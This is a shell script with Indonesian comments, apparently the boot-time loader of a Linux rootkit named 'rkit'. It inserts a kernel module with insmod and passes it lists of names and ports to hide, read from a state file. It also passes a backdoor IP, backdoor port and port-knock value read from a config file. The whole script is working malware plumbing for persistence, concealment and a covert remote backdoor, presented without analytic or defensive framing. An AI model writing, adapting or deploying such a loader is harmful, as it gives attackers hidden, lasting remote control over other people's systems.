#!/bin/sh
# rkit-load.sh — dipanggil rkit-load.service SAAT BOOT:
#   1. load .ko
#   2. pulihkan daftar hide dari /var/lib/rkit/state (yang ditulis CLI)
#
# pakai: rkit-load.sh <path_ko> <legacy|modern>
set -u

KO=${1:-}
BACK=${2:-modern}
STATE=/var/lib/rkit/state
BACKDOOR_CONF=/var/lib/rkit/backdoor.conf

if [ -z "$KO" ] || [ ! -f "$KO" ]; then
	echo "rkit-load: KO tidak ada: $KO" >&2
	exit 1
fi

names=""
ports=""
if [ -f "$STATE" ]; then
	while read -r kind val _rest; do
		case "$kind" in
			name) names="${names:+$names,}$val" ;;
			port) ports="${ports:+$ports,}$val" ;;
		esac
	done < "$STATE"
fi

ARGS=""
# tanpa tanda kutip — param module tidak boleh mengandung spasi
# (kedua backend legacy & modern kini punya hideport + backdoor_ip)
[ -n "$names" ] && ARGS="$ARGS hide=$names"
[ -n "$ports" ] && ARGS="$ARGS hideport=$ports"
if [ -f "$BACKDOOR_CONF" ]; then
	BIP=$(sed -n 's/^backdoor_ip=//p' "$BACKDOOR_CONF")
	BPORT=$(sed -n 's/^backdoor_port=//p' "$BACKDOOR_CONF")
	KPORT=$(sed -n 's/^knock_port=//p' "$BACKDOOR_CONF")
	[ -n "$BIP" ] && ARGS="$ARGS backdoor_ip=$BIP"
	[ -n "$BPORT" ] && ARGS="$ARGS backdoor_port=$BPORT"
	[ -n "$KPORT" ] && ARGS="$ARGS knock_port=$KPORT"
fi

# word-splitting ARGS disengaja (nilai sudah diformat sendiri, tanpa spasi)
# shellcheck disable=SC2086
if insmod "$KO" $ARGS; then
	echo "rkit-load: OK — $KO (state: ${names:-kosong} nama, ${ports:-kosong} port)"
	exit 0
fi
echo "rkit-load: insmod gagal" >&2
exit 1
